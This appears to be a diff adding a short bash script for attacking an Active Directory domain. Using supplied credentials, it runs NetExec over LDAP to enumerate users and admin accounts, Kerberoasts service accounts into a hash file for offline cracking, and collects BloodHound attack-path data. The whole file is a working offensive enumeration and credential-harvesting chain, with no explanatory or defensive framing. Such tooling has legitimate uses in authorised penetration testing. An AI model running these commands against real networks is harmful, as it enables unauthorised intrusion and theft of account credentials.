@@ -1,0 +1,19 @@
+#!/bin/bash
+
+IP=$1
+USER=$2
+PASS=$3
+
+echo "[+] Enumerating users..."
+nxc ldap $IP -u $USER -p $PASS --users
+
+echo "[+] Checking admin accounts..."
+nxc ldap $IP -u $USER -p $PASS --admin-count
+
+echo "[+] Running Kerberoast..."
+nxc ldap $IP -u $USER -p $PASS --kerberoasting kerb.txt
+
+echo "[+] Collecting BloodHound data..."
+nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All
+
+echo "[+] Done"
